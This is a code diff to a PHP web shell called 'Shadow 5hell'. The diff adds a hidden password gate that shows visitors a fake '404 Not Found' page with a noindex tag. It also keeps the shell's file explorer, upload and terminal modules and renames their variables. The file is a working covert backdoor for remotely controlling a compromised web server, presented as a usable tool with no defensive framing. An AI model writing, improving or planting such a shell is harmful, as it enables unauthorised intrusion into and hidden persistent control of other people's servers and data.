@@ -1,6 +1,141 @@
 <?php
-$GLOBALS['module_to_load'] = array("explorer", "upload");
 
+/**
+ * Shadow 5hell
+ * 
+ * @category Seucurity
+ *
+ * @package Shadow
+ * 
+ * @author Cvar1984 <Cvar1984@protonmail.com>
+ * 
+ * @license WTFPL http://www.wtfpl.net/txt/copying/
+ * 
+ * @link https://github.com/Cvar1984
+ */
+
+$email = '';
+$GLOBALS['moduleLoad'] = array("explorer", "upload");
+$password = '$2y$10$.WwaTEc/a4WSxMr0GZZypOSqkiwkia.fIlxGEIYM/Yw4a1WKo0H9G';
+$serverIp = $_SERVER['SERVER_ADDR'];
+$sessionName = bin2hex($_SERVER["HTTP_HOST"]) . $password;
+$sessionKey = sha1(getClientIp()) ? : $password;
+
+session_start();
+
+/* --------------------------- function definition -------------------------- */
+/**
+ * Login function contain html form in it
+ *
+ * @return void
+ */
+function login()
+{
+    global $password, $sessionName, $sessionKey;
+    if (isset($_POST['pass'])) {
+        $gpass = $_POST["pass"];
+        $sessionAuth = '';
+        $_SESSION[$sessionName] = &$sessionAuth;
+
+        if (password_verify($gpass, $password)) {
+            $sessionAuth = $sessionKey;
+        }
+    }
+    header('HTTP/1.1 404 Not Found');
+    echo <<<EOF
+<!DOCTYPE HTML>
+<html>    
+    <head>
+        <title>404 Not Found</title>
+        <meta name="robots" content="noindex;nofollow" />
+    </head>
+    <body>
+        <form method="POST" onsubmit="return true">
+            <input name="pass" />
+            <input type="submit" />
+        </form>
+    </body>
+</html>
+EOF;
+    exit;
+
+}
+
+/**
+ *
+ * Logout function, destroy and cleanup session
+ *
+ * @return void
+ */
+function logout()
+{
+    session_unset();
+    session_destroy();
+}
+/**
+ *
+ * Get client ip address, return false when client ip can't be found
+ *
+ * @return string|bool
+ */
+function getClientIp()
+{
+    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    } else {
+        $ipaddress = false;
+    }
+    return $ipaddress;
+}
+function lists($cwd, $type) {
+    $result = [];
+    foreach (scandir($cwd) as $key => $value) {
+        $file["path"] = $cwd . DIRECTORY_SEPARATOR . $value;
+        $file = 
+            [
+                $file["path"], // full path
+                $value // single path
+            ];
+
+        switch ($type) {
+        case "all":
+            if (is_dir($file[0]) || $file[1] === "." || $file[1] === "..") {
+                $result[] = $file;
+                continue 2;
+            }
+            break;
+
+        case "dir":
+            if (!is_dir($file[0]) || $file[1] === "." || $file[1] === "..") continue 2;
+            break;
+
+        case "file":
+            if (!is_file($file[0])) continue 2;
+            break;
+        } $result[] = $file;
+    } return $result;
+}
+/* ------------------------------ end fundtion ------------------------------ */
+
+/* ---------------------------------- auth --------------------------------- */
+if (!isset($_SESSION[$sessionName])) {
+    login();
+}
+if ($_SESSION[$sessionName] !== $sessionKey) {
+    login();
+}
+
+/* -------------------------------- loged in -------------------------------- */
 if(!function_exists('getSelf')){
 	function getSelf(){
 		$query = (isset($_SERVER["QUERY_STRING"]) && (!empty($_SERVER["QUERY_STRING"]))) ? "?".$_SERVER["QUERY_STRING"]: "";
@@ -655,7 +790,7 @@ if (!function_exists("showFiles")) {
 		$output .= "</tbody><tfoot>";
 
 		$colspan = 1 + count($finfo);
-		$output .= "<tr>
+		/*$output .= "<tr>
 						<td>
 							<div class='cBoxAll'></div>
 						</td>
@@ -687,7 +822,7 @@ if (!function_exists("showFiles")) {
 						<td></td>
 						<td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td>
 					</tr>
-		";
+		";*/
 		$output .= "</tfoot></table>";
 		return $output;
 	}
@@ -1379,13 +1514,13 @@ if(!function_exists('decode_line')){
 			</div>
 			
 				<?php
-				foreach($GLOBALS['module_to_load'] as $value){
+				foreach($GLOBALS['moduleLoad'] as $value){
 					echo "<a class='menuitem' id='menu".$GLOBALS['module'][$value]['id']."' href='#!".$GLOBALS['module'][$value]['id']."'>".$GLOBALS['module'][$value]['title']."</a>";
 				}
 				?>
 			<div id='content'>
 				<?php
-				foreach($GLOBALS["module_to_load"] as $value){
+				foreach($GLOBALS["moduleLoad"] as $value){
 					?>
 					<div class="menucontent" id="<?= $GLOBALS['module'][$value]['id'] ?>"><?= $GLOBALS['module'][$value]['content'] ?></div>
 					<?php
@@ -1397,7 +1532,7 @@ if(!function_exists('decode_line')){
 		<form action='<?php echo getSelf(); ?>' method='post' id='form' target='_blank'></form>
 		<script type='text/javascript'>
 			var targeturl = '<?php echo getSelf(); ?>';
-			var module_to_load = '<?php echo "explorer";?>';
+			var moduleLoad = '<?php echo "explorer";?>';
 			var win = <?php echo (isWin())?'true':'false';?>;
 			var init_shell = true;
 			/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */
@@ -1456,7 +1591,7 @@ if(1==a.tHead.rows.length){sortbottomrows=[];for(var b=0;b<a.rows.length;b++)-1!
 					var now = new Date();
 					output("started @ "+ now.toGMTString());
 					output("cwd : "+cwd());
-					output("module : "+module_to_load);
+					output("module : "+moduleLoad);
 
 					show_tab();
 					xpl_bind();
@@ -2689,11 +2824,18 @@ $('#terminalInput').on('keydown', function(e){
 
 
 <?php
-foreach($GLOBALS['module_to_load'] as $value){
-	echo "function ".$GLOBALS['module'][$value]['id']."(){ ".$GLOBALS['module'][$value]['js_ontabselected']." }\n";
+foreach($GLOBALS['moduleLoad'] as $value){
+	?>
+	function <?= $GLOBALS['module'][$value]['id'] ?>() {
+		<?= $GLOBALS['module'][$value]['js_ontabselected'] ?>
+	} 
+	<?php
 }
 ?>
 </script>
 <!--script end-->
 </body>
-</html><?php die();?>
+</html>
+<?php die();?>
+    </body>
+</html>
